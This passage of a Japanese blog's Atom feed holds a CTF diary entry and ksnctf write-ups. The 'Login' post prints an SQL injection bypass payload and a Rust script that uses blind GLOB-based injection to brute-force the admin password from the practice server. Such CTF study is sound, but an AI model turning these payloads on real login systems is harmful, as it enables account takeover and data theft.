@@ -1,0 +1,1569 @@
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="jp"><generator uri="https://jekyllrb.com/" version="4.2.2">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" hreflang="jp" /><updated>2023-05-16T03:58:43+00:00</updated><id>/feed.xml</id><title type="html">逝く道</title><subtitle>どこまでも逝こう。</subtitle><entry><title type="html">テスト2</title><link href="/contents/diary/2022/12/06/hello.html" rel="alternate" type="text/html" title="テスト2" /><published>2022-12-06T07:00:00+00:00</published><updated>2022-12-06T07:00:00+00:00</updated><id>/contents/diary/2022/12/06/hello</id><content type="html" xml:base="/contents/diary/2022/12/06/hello.html"><![CDATA[<p>　テスト2</p>]]></content><author><name></name></author><category term="contents" /><category term="diary" /></entry><entry><title type="html">ksnctf 007 Programming</title><link href="/contents/tech/ctf_ksnctf/2021/05/27/007.html" rel="alternate" type="text/html" title="ksnctf 007 Programming" /><published>2021-05-27T12:38:04+00:00</published><updated>2021-05-27T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/27/007</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/27/007.html"><![CDATA[<h2 id="ksnctf-007-programming">ksnctf 007 Programming</h2>
+<ul>
+  <li>問題公開日: 2012/05/26</li>
+  <li>ジャンル:</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+
+<h2 id="所感">所感</h2>]]></content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">きゃぷちゃーざふらっぐ</title><link href="/contents/diary/2021/05/22/hello.html" rel="alternate" type="text/html" title="きゃぷちゃーざふらっぐ" /><published>2021-05-22T12:38:04+00:00</published><updated>2021-05-22T12:38:04+00:00</updated><id>/contents/diary/2021/05/22/hello</id><content type="html" xml:base="/contents/diary/2021/05/22/hello.html"><![CDATA[<p>　最近、Techの記事ばかり書いているが、その原因は偏にCTF(Capture the flag)に手を出し始めたが故である。CTFの問いをひたすら解いている間はとても心が平穏になるため、非常に良い。しかし、あまりに平穏過ぎてDiaryを書きたいと思う瞬間がなかなか訪れない。たまにはDiaryも書いてみようかと。</p>
+
+<h2 id="ctf">CTF</h2>
+<p>　何が面白いのかと問われればいくつもあるのだが、ここでは一つ挙げようと思う。CTF特有の面白さではないが、最近の私が重要視している事柄であるからご容赦願いたい。</p>
+
+<p>　ずばり、<strong>未知との遭遇</strong>である。</p>
+
+<p>　一応は情報工学を専門として大学を卒業した私であるが、CTFを楽しもうとするとまったくの未知が多量に押し寄せてくる。</p>
+
+<p>　FLAGを取ったら勝ちというルールであるが、そのための道のりで知らない知識を拾い集めながら進まなければ勝利を手にすることは出来ない。</p>
+
+<p>　この過程に私は面白さを見出しているし価値を感じている。</p>
+
+<p>　それは私のこれまでの生き方が原因とも言える。</p>
+
+<h2 id="動いたなら良し">動いたなら良し</h2>
+<p>　プログラムを学び始めた頃、私の頭の中では<strong>「動いたならそれで良い」</strong>とばかり考えていた。詳しい動作理念など知らなくとも、プログラムは勝手にコンパイルされて実行したらなぜか期待する動作をしてくれる。そういう存在であった。</p>
+
+<p>　しかし、いざ社会に出てみると、<strong>より良いコードを目指す</strong>ことが重要であると知った。ソフトウェアの品質を担保する即ちソースコードの品質を担保するということであり、動いたら良いという指標は役に立たなくなってしまった。</p>
+
+<p>　この変化には薄々気づいていたのだが、いざそう言われてもでは何を指標にして目の前のソースコードを評価すれば良いのかピンと来ない。今でも十分な評価を与えられない。</p>
+
+<p>　評価軸はいくつもあるだろう。読みやすさ・見やすさ・論理構造の明瞭さ・制御構造の簡潔さ・関数を一目見て100を理解出来る伝達力・欲しい時に欲しい情報が記述されている注釈などなど。</p>
+
+<p>　それなりに意識しているが、任せてくださいと言える日は来ない。</p>
+
+<p>　しかして、「動いたならそれで良い」という思考は修正する方向に向かうのだが、その発想に至る根本は中々治るものではない。</p>
+
+<h2 id="テストを通過したなら良し">テストを通過したなら良し</h2>
+<p>　学生時代の過ごし方を見ても、やれやれと思わずにはいられない。</p>
+
+<p>　例えば、学校のテストがあったとしよう。その時の思考はよし勉強するぞと思っているのだが、その勉強方法は<strong>その場しのぎ的な勉強法</strong>なのだ。</p>
+
+<p>　つまり、テストが終わったならテストでやった内容はすっかり忘れてしまう。</p>
+
+<p>　次に生かすような勉強ではないのだ。</p>
+
+<p>　テストは出題範囲が決まっており、<strong>その範囲をブルートフォースして短期的に覚えておけば</strong>そこそこの点を取れてしまう。抽象を理解したり知識の鎖を連環させたりと効率良く記憶する必要はなく、一問一答で出そうな問題と解法を覚えておくだけで良いのだ。</p>
+
+<p>　まあ、この覚え方も思い出すと圧倒的な気力が必要な気もするのだが、難しい事はない。時間をかけてテストぎりぎりまで無限に反復するだけである。その意味で言えば、学生時代を無為に過ごした時間というのは多いと言えるかもしれないが、無類の無限反復能力があったからこそ今があり、今でも短期記憶には多少自信がある。</p>
+
+<p>　一方で、深い理解をする能力が幼児並みと揶揄されても反論は出来ず、長期記憶に対する信頼はゴミ以下と言える。</p>
+
+<p>　懐かしき義務教育の期間をこうして振り返っても「動いたならそれで良い」の精神が読み解ける。貴重な思い出だ。</p>
+
+<h2 id="ゲームを遊ぶ時も">ゲームを遊ぶ時も</h2>
+<p>　誰もが楽しむゲーム一つ取っても残念な事に気づく。</p>
+
+<p>　アクションゲームやRPGの戦闘は、<strong>テンポ良く瞬間瞬間に問題解決していく</strong>ことだろう。ゲームというのはこうした些細な積み重ねがいつかは魔王を倒す事に繋がる。一つ一つの問題は小さく大量にちりばめられており、次々と解決していけば自然と操作方法や攻略方法が身についていくものである。</p>
+
+<p>　一方で、将棋のように一手一手が後の盤面に大きな影響を残すタイプになると途端にどうにもならなくなる。</p>
+
+<p>　言ってしまえば、一手先すら読むのが困難なのだ。大局どころか数手先の未来は闇の中である。</p>
+
+<p>　まったく苦手であるとは言わないが、時間はかかるし良い手に辿り着かないし、気が付けば手に負えないと感じてしまう。</p>
+
+<h2 id="短期記憶の次がない">短期記憶の次がない</h2>
+
+<p>　次々に現れる謎を連続して解くようなのは良いのだが、長期的な視点を重要視されるのはやはり得意ではない。面白いとは感じるのだが、頭の中でどう記憶してどう生かすべきかがなかなかまとまらないのだ。</p>
+
+<p>　本来は小さな謎を時ながら知識を体系化して長期記憶に蓄えて実践で生かすということなのだろうが、私は長期記憶するプロセスを意識的に行えておらず大抵の場合は短期記憶で打ち止めとなるような学習・実践を行う癖があると言えるだろう。</p>
+
+<p>　勿論何もかもが短期記憶で止まるかといえばそうではない。長期記憶にするかしないかの区分けの仕方は不明だが、長期記憶に行く事柄は行くのである。ただ、その量は常人と比較すれば微々たる量だろう。</p>
+
+<p>　結局、しっかり覚えようと思ったら、しっかり時間を取らないと覚えられない。</p>
+
+<p>　戦いながら成長することはほとんどないということだ。このことが一般的であるかは分からない。ただ、一般的にはみんな戦いながら成長しているように見える。影なる努力かもしれないが。</p>
+
+<h2 id="未知への免疫不足">未知への免疫不足</h2>
+<p>　結局のところ、既知の事柄を短期的に記憶して、瞬間的にささっと処理していくことばかりやってきたのだ。精度や正確性が決して高いわけではない。ただ、そうしてきた。</p>
+
+<p>　すると、ちょっと複雑な未知に遭遇すると途端に崩壊する。</p>
+
+<p>　ささっと処理できないのだ。仮に無理やり通したとしてもそのことが後に影響して良い結果を得られないで終わる。</p>
+
+<p>　従って、私は<strong>ちょっと複雑な未知を解決するプロセス</strong>を鍛えたいと思っていた。</p>
+
+<p>　<strong>CTF はその良い題材になりうる</strong>と感じている。</p>
+
+<p>　初めはそういうつもりではなかったが、やってみるとまさに求めていたものであった。というより、ああ私が苦手だったのはこれなのかと痛感したわけである。</p>
+
+<p>　CTF は大抵の場合、私にとって未知の要素を用いて展開される。だからまずは未知の要素を知るところから始まる。</p>
+
+<p>　このプロセスは何も CTF に限ったことではなく、日常的に過ごしていれば、特に仕事では普通のプロセスだと今では思う。仕事を遂行するために全てが既知であることなどあるだろうか。少なくとも前の職場は未知の割合の方が多かった。</p>
+
+<p>　<strong>未知への免疫を育てることが私を前に進ませるのだ。</strong></p>
+
+<h2 id="自分の成長を眺める">自分の成長を眺める</h2>
+<p>　このブログは日記・技術足跡・自作小説で展開していたが、今回のCTFに取り組むに当たり、<strong>「Memo」</strong>なるページも追加することをした。</p>
+
+<p>　いわば、 wiki のようなものだ。</p>
+
+<p>　これでこのブログにも記憶領域と呼べる空間が出来た。</p>
+
+<p>　長期記憶が苦手でもこのブログが私の代わりに記憶してくれる。もちろん、未知への免疫を高めることを通じて、私自身の長期記憶の性能も高まると期待しているが、このブログのMemoほどの性能にはならないだろう。</p>
+
+<p>　また、Memoとしてまとめることで、私の長期記憶への反映が安定するようにもなっている。Memoに書いたことならいまのところほとんどを記憶している。ついこの前も非同期通信についての知識をMemoを見ずに諳んじることが出来たほどだ。</p>
+
+<p>　私はこのブログと共に成長していこうと思う。</p>
+
+<p>　心が淀んだ時にいろいろと吐き出せる場所としての日記だとも思っていたが、今日のは未来に繋がるような明るい日記になってしまった。</p>
+
+<p>　たまにはこういうのも良い。</p>
+
+<p>　それでは。また。</p>]]></content><author><name></name></author><category term="contents" /><category term="diary" /></entry><entry><title type="html">ksnctf 006 Login</title><link href="/contents/tech/ctf_ksnctf/2021/05/21/006.html" rel="alternate" type="text/html" title="ksnctf 006 Login" /><published>2021-05-21T12:38:04+00:00</published><updated>2021-05-21T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/21/006</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/21/006.html"><![CDATA[<h2 id="ksnctf-006-login">ksnctf 006 Login</h2>
+<ul>
+  <li>問題公開日: 2012/05/26</li>
+  <li>ジャンル: web</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+<p>　正しい <code class="language-plaintext highlighter-rouge">admin</code> <code class="language-plaintext highlighter-rouge">pass</code> を入れる問題だ。</p>
+
+<p>　と言っても特別ヒントはない。が、これはおそらく <code class="language-plaintext highlighter-rouge">SQLインジェクション</code> と呼ばれる脆弱性を突く問題だろう。</p>
+
+<p>　ユーザーの管理は基本的にDB管理しているものだろう。となれば、ブラウザからの入力を受けて SQL を発行していると考えられる。</p>
+
+<p>　この時、入力を通して、意図しない動作をユーザーが任意に行える場合がある。</p>
+
+<p>　ということで、その方針で進めてみる。</p>
+
+<h3 id="適当に">適当に</h3>
+
+<div class="language-yaml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="na">admin</span><span class="pi">:</span> <span class="s">admin</span>
+<span class="na">pass</span><span class="pi">:</span> <span class="s1">'</span><span class="nv"> </span><span class="s">OR</span><span class="nv"> </span><span class="s">'t' = 't</span>
+</code></pre></div></div>
+
+<p>　と入れてみると、見事に画面が切り替わる。</p>
+
+<p>　そこに寄れば、「<code class="language-plaintext highlighter-rouge">admin</code> のパスワードこそがフラグだ」と記されている。</p>
+
+<p>　このページから分かることは様々あるが、重要なことは。</p>
+
+<p>　まず、DBは <code class="language-plaintext highlighter-rouge">sqlite</code> である</p>
+
+<p>　次に、クエリの構成が以下である。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'$id'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">'$pass'</span>
+</code></pre></div></div>
+
+<p>　先ほどの入力はつまり、</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="s1">'t'</span> <span class="o">=</span> <span class="s1">'t'</span>
+</code></pre></div></div>
+
+<p>　となっていたからSQLが通ったわけである。 OR 以降が必ず true になるため。</p>
+
+<p>　さて、これらを踏まえて、早速 <code class="language-plaintext highlighter-rouge">admin</code> のパスワードを特定しよう。</p>
+
+<p>　id については <code class="language-plaintext highlighter-rouge">admin</code> で間違いないが、 pass をどうやって特定しようか。</p>
+
+<h3 id="特定する">特定する</h3>
+
+<p>　色々考えたが、結局ブルートフォース案しか浮かばなかったので、それにする。</p>
+
+<p>　SQLにはワイルドカードを利用出来る。即ち、</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="n">pass</span> <span class="k">LIKE</span> <span class="s1">'%'</span>
+</code></pre></div></div>
+
+<p>　という指定の仕方だ。 <code class="language-plaintext highlighter-rouge">%</code> は LIKE におけるワイルドカードであり、0文字以上の文字とヒットする。従って、上記のSQLは確実に通る。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">_</code> もあり、これは任意の1文字とヒットする。</p>
+
+<p>　これを使って、文字数を特定できる。一文字ずつ <code class="language-plaintext highlighter-rouge">_</code> を増やして入力を試してみると、</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- pass の長さは 21文字</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="n">pass</span> <span class="k">LIKE</span> <span class="s1">'_____________________'</span>
+</code></pre></div></div>
+
+<p>　であることが分かった。上記のSQLは通る。</p>
+
+<p>　また、フラグの形式は <code class="language-plaintext highlighter-rouge">FLAG_......</code> であることも踏まえると、以下まで確定する。</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- `FLAG_` を除いた pass の長さは 16文字</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="n">pass</span> <span class="k">LIKE</span> <span class="s1">'FLAG_________________'</span>
+</code></pre></div></div>
+
+<p>　FLAGに使われる文字は <code class="language-plaintext highlighter-rouge">[a-z]</code> <code class="language-plaintext highlighter-rouge">[A-Z]</code> <code class="language-plaintext highlighter-rouge">[0-9]</code> の62文字であり、ブルートフォースを仕掛けた場合、 62文字 * 16文字 = 992文字 である。それほど多くはない。</p>
+
+<p>　というわけで何とかなりそうである。</p>
+
+<h3 id="like-ではなく-glob">LIKE ではなく GLOB</h3>
+
+<p>　実は <code class="language-plaintext highlighter-rouge">sqlite</code> の <code class="language-plaintext highlighter-rouge">LIKE</code> は大文字と小文字を区別してくれない。</p>
+
+<p>　そのため、ブルートフォースを仕掛ける前にSQLを修正する必要がある。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">LIKE</code> ではなく <code class="language-plaintext highlighter-rouge">GLOB</code> を使うようにするということだ。</p>
+
+<p>　パターンマッチングを利用する <code class="language-plaintext highlighter-rouge">GLOB</code> を用いる。</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>LIKE</th>
+      <th>GLOB</th>
+      <th>説明</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">%</code></td>
+      <td><code class="language-plaintext highlighter-rouge">*</code></td>
+      <td>任意の0文字以上</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">_</code></td>
+      <td><code class="language-plaintext highlighter-rouge">?</code></td>
+      <td>任意の1文字</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>　<code class="language-plaintext highlighter-rouge">GLOB</code> では <code class="language-plaintext highlighter-rouge">%</code> の代わりに <code class="language-plaintext highlighter-rouge">*</code> を、<code class="language-plaintext highlighter-rouge">_</code> の代わりに <code class="language-plaintext highlighter-rouge">?</code> を使う。従って、</p>
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">-- GLOB ver</span>
+<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="k">user</span> <span class="k">WHERE</span> <span class="n">id</span><span class="o">=</span><span class="s1">'admin'</span> <span class="k">AND</span> <span class="n">pass</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="n">pass</span> <span class="n">GLOB</span> <span class="s1">'FLAG_????????????????'</span>
+</code></pre></div></div>
+
+<p>　となる。</p>
+
+<p>　これで抑えるべき事項は全てだ。</p>
+
+<p>　後はブルートフォースを仕掛けるだけだ。手作業だと大変なので、プログラムで行う。</p>
+
+<p>　毎度お馴染みRustの時間である。</p>
+
+<h3 id="ブルートフォース">ブルートフォース</h3>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="k">crate</span> <span class="n">reqwest</span><span class="p">;</span>
+
+<span class="nd">#[tokio::main]</span>
+<span class="k">async</span> <span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="k">-&gt;</span> <span class="nb">Result</span><span class="o">&lt;</span><span class="p">(),</span> <span class="nb">Box</span><span class="o">&lt;</span><span class="k">dyn</span> <span class="nn">std</span><span class="p">::</span><span class="nn">error</span><span class="p">::</span><span class="n">Error</span><span class="o">&gt;&gt;</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">strings</span> <span class="o">=</span> <span class="p">[</span><span class="s">"a"</span><span class="p">,</span><span class="s">"b"</span><span class="p">,</span><span class="s">"c"</span><span class="p">,</span><span class="s">"d"</span><span class="p">,</span><span class="s">"e"</span><span class="p">,</span><span class="s">"f"</span><span class="p">,</span><span class="s">"g"</span><span class="p">,</span><span class="s">"h"</span><span class="p">,</span><span class="s">"i"</span><span class="p">,</span><span class="s">"j"</span><span class="p">,</span><span class="s">"k"</span><span class="p">,</span><span class="s">"l"</span><span class="p">,</span><span class="s">"m"</span><span class="p">,</span><span class="s">"n"</span><span class="p">,</span><span class="s">"o"</span><span class="p">,</span><span class="s">"p"</span><span class="p">,</span><span class="s">"q"</span><span class="p">,</span><span class="s">"r"</span><span class="p">,</span><span class="s">"s"</span><span class="p">,</span><span class="s">"t"</span><span class="p">,</span><span class="s">"u"</span><span class="p">,</span><span class="s">"v"</span><span class="p">,</span><span class="s">"w"</span><span class="p">,</span><span class="s">"x"</span><span class="p">,</span><span class="s">"y"</span><span class="p">,</span><span class="s">"z"</span><span class="p">,</span><span class="s">"A"</span><span class="p">,</span><span class="s">"B"</span><span class="p">,</span><span class="s">"C"</span><span class="p">,</span><span class="s">"D"</span><span class="p">,</span><span class="s">"E"</span><span class="p">,</span><span class="s">"F"</span><span class="p">,</span><span class="s">"G"</span><span class="p">,</span><span class="s">"H"</span><span class="p">,</span><span class="s">"I"</span><span class="p">,</span><span class="s">"J"</span><span class="p">,</span><span class="s">"K"</span><span class="p">,</span><span class="s">"L"</span><span class="p">,</span><span class="s">"M"</span><span class="p">,</span><span class="s">"N"</span><span class="p">,</span><span class="s">"O"</span><span class="p">,</span><span class="s">"P"</span><span class="p">,</span><span class="s">"Q"</span><span class="p">,</span><span class="s">"R"</span><span class="p">,</span><span class="s">"S"</span><span class="p">,</span><span class="s">"T"</span><span class="p">,</span><span class="s">"U"</span><span class="p">,</span><span class="s">"V"</span><span class="p">,</span><span class="s">"W"</span><span class="p">,</span><span class="s">"X"</span><span class="p">,</span><span class="s">"Y"</span><span class="p">,</span><span class="s">"Z"</span><span class="p">,</span><span class="s">"0"</span><span class="p">,</span><span class="s">"1"</span><span class="p">,</span><span class="s">"2"</span><span class="p">,</span><span class="s">"3"</span><span class="p">,</span><span class="s">"4"</span><span class="p">,</span><span class="s">"5"</span><span class="p">,</span><span class="s">"6"</span><span class="p">,</span><span class="s">"7"</span><span class="p">,</span><span class="s">"8"</span><span class="p">,</span><span class="s">"9"</span><span class="p">];</span>
+
+    <span class="nd">eprintln!</span><span class="p">(</span><span class="s">"*** 開始 ***"</span><span class="p">);</span>
+    
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">prefix</span><span class="p">:</span> <span class="nb">String</span> <span class="o">=</span> <span class="nn">String</span><span class="p">::</span><span class="nf">from</span><span class="p">(</span><span class="s">"' OR pass GLOB 'FLAG_"</span><span class="p">);</span>
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">suffix</span> <span class="o">=</span> <span class="s">"*"</span><span class="p">;</span>
+    
+    <span class="k">for</span> <span class="n">number</span> <span class="k">in</span> <span class="mi">1</span><span class="o">..</span><span class="mi">17</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="n">number</span> <span class="o">==</span> <span class="mi">16</span> <span class="p">{</span> <span class="n">suffix</span> <span class="o">=</span> <span class="s">""</span><span class="p">;</span> <span class="p">}</span>
+        <span class="k">for</span> <span class="n">s</span> <span class="k">in</span> <span class="n">strings</span><span class="nf">.iter</span><span class="p">()</span> <span class="p">{</span>
+            <span class="k">let</span> <span class="n">pass</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span><span class="s">"{}{}{}"</span><span class="p">,</span> <span class="n">prefix</span><span class="nf">.to_string</span><span class="p">(),</span> <span class="n">s</span><span class="p">,</span> <span class="n">suffix</span><span class="p">);</span>
+            <span class="k">let</span> <span class="n">params</span> <span class="o">=</span> <span class="p">[(</span><span class="s">"id"</span><span class="p">,</span> <span class="s">"admin"</span><span class="p">),</span> <span class="p">(</span><span class="s">"pass"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">pass</span><span class="p">)];</span>
+            <span class="k">let</span> <span class="n">client</span> <span class="o">=</span> <span class="nn">reqwest</span><span class="p">::</span><span class="nn">Client</span><span class="p">::</span><span class="nf">new</span><span class="p">();</span>
+            <span class="k">let</span> <span class="n">res</span> <span class="o">=</span> <span class="n">client</span><span class="nf">.post</span><span class="p">(</span><span class="s">"https://ctfq.u1tramarine.blue/q6/index.php"</span><span class="p">)</span>
+                <span class="nf">.form</span><span class="p">(</span><span class="o">&amp;</span><span class="n">params</span><span class="p">)</span>
+                <span class="nf">.send</span><span class="p">()</span>
+                <span class="k">.await</span><span class="o">?</span><span class="p">;</span>
+
+            <span class="c1">// println!("{:#?}", res);</span>
+            
+            <span class="k">if</span> <span class="n">res</span><span class="nf">.content_length</span><span class="p">()</span> <span class="o">&gt;</span> <span class="nf">Some</span><span class="p">(</span><span class="mi">2000</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nd">println!</span><span class="p">(</span><span class="s">"{}: {:?}{}"</span><span class="p">,</span> <span class="n">number</span><span class="p">,</span> <span class="n">res</span><span class="nf">.content_length</span><span class="p">(),</span> <span class="n">pass</span><span class="p">);</span>
+                <span class="n">prefix</span><span class="nf">.push_str</span><span class="p">(</span><span class="n">s</span><span class="p">);</span>
+                <span class="k">break</span><span class="p">;</span>
+            <span class="p">}</span>
+        <span class="p">}</span>
+        <span class="nd">eprintln!</span><span class="p">(</span><span class="s">"*** next ***"</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="nd">eprintln!</span><span class="p">(</span><span class="s">"*** 終了 ***"</span><span class="p">);</span>
+    <span class="nf">Ok</span><span class="p">(())</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>　<code class="language-plaintext highlighter-rouge">FLAG_*</code> <code class="language-plaintext highlighter-rouge">FLAG_A*</code> <code class="language-plaintext highlighter-rouge">FLAG_AA*</code> のように0文字以上マッチ<code class="language-plaintext highlighter-rouge">*</code>を末尾につけながら、一文字ずつ特定している。</p>
+
+<p>　丁度良い指標が無かったので、 <code class="language-plaintext highlighter-rouge">content_length</code> を使った。失敗した時のコンテンツの長さは 500 程度で、成功する 2200 程度だったので、これを元に正しいかどうかを判定した。</p>
+
+<p>　Rust スキルも徐々に向上していて良い。良い。</p>
+
+<h3 id="おしまい">おしまい</h3>
+
+<p>　無事にFLAGをゲットできた。おしまい。</p>
+
+<h2 id="所感">所感</h2>
+
+<p>　今回は問題を見た時に謎が分かってしまったため、ささっと出来てしまった。</p>
+
+<p>　しいて謎となったのは、以下2点である。</p>
+
+<ul>
+  <li>pass をどうやって特定しようかという点</li>
+  <li>GLOB 句を探し当てるという点</li>
+</ul>
+
+<p>　LIKE 句で上手くいかなくてそこで <code class="language-plaintext highlighter-rouge">mysql</code> じゃないということに気付いたのだから、なめていたと言われてもしょうがない。</p>
+
+<p>　とはいえ、謎が分かったとしても実際に攻撃を仕掛けられるかどうかは違うわけで、ちゃんとFLAGを取れたのは良かった。</p>
+
+<p>　しかし、ブルートフォースで良かったのだろうか。SQL文をあれこれしたら案外SELECT文で取れたりしたのだろうか。まあきっとそれもおいおい分かるに違いない。似た別の問題に出会った時にこの謎は解ける。</p>
+
+<p>　ではこのへんで。
+　</p>]]></content><author><name></name></author><category term="contents" /><category term="tech" /><category term="CTF_ksnctf" /></entry><entry><title type="html">ksnctf 005 Onion</title><link href="/contents/tech/ctf_ksnctf/2021/05/20/005.html" rel="alternate" type="text/html" title="ksnctf 005 Onion" /><published>2021-05-20T12:38:04+00:00</published><updated>2021-05-20T12:38:04+00:00</updated><id>/contents/tech/ctf_ksnctf/2021/05/20/005</id><content type="html" xml:base="/contents/tech/ctf_ksnctf/2021/05/20/005.html"><![CDATA[<h2 id="ksnctf-005-onion">ksnctf 005 Onion</h2>
+<ul>
+  <li>問題公開日: 2012/05/26</li>
+  <li>ジャンル: crypto</li>
+</ul>
+
+<h3 id="謎解き">謎解き</h3>
+
+<p>　謎は、問題文である。</p>
+
+<p>　実は紆余曲折あったのだが、それは所感で記すとしよう。</p>
+
+<p>　この問題文を見て、何か気づくことがないだろうか。</p>
+
+<p>　私が気づいたのは以下の2点である。</p>
+
+<ul>
+  <li><strong>[a-z][A-Z][0-9] の62種</strong>で構成されている</li>
+  <li><strong>一行76文字</strong>である。</li>
+</ul>
+
+<p>　これらを元に検索してみたところ、この問題文は <code class="language-plaintext highlighter-rouge">Base64</code> でエンコードされたものであると分かった。</p>
+
+<p>　早速、 Base64 でデコードしてみる。</p>
+
+<p>　デコード結果を見てがっかりした人もいるかもしれない。何も変わっていないように見えるからだ。</p>
+
+<p>　しかし、良く見ると<strong>文字列が短くなっている</strong>ことが分かる。</p>
+
+<p>　私はここで、この問題のタイトルが「Onion」であることを思い出し思い至った。</p>
+
+<p>　<strong>Base64 でエンコードしたテキストをさらに Base64 でエンコードしているのだということに。</strong></p>
+
+<p>　玉ねぎの皮を剥くように Base64 でデコードし続けていくと、新しい文字列にぶつかった。</p>
+
+<p>　新しい文字列は非常に特徴的な文字列であり、調べてみると、 <code class="language-plaintext highlighter-rouge">uuencode</code> というエンコーディング方式であることが分かった。</p>
+
+<p>　<code class="language-plaintext highlighter-rouge">Base64</code> も <code class="language-plaintext highlighter-rouge">uuencode</code> もメールと関連しているエンコーディング方式であり、まず間違いない。</p>
+
+<p>　新しい文字列を uu で decode すると、FLAG が現れて完了。</p>
+
+<p>　Base64であることに気づけるかどうかが全ての焦点であった。</p>
+
+<h3 id="おまけ">おまけ</h3>
+<p>　玉ねぎの皮剥きは結構な量があって手作業だと大変だったので一応プログラムを書いた。</p>
+
+<p>　今回も Rust を使ってみた。</p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="k">crate</span> <span class="n">base64</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nn">base64</span><span class="p">::{</span><span class="n">decode</span><span class="p">};</span>
+
+<span class="k">fn</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+    <span class="c1">// Base64</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="s">"＜問題文＞"</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
+    <span class="k">let</span> <span class="n">onion_str</span> <span class="o">=</span> <span class="o">&amp;</span><span class="nf">get_decode_cipher</span><span class="p">(</span><span class="n">onion_str</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
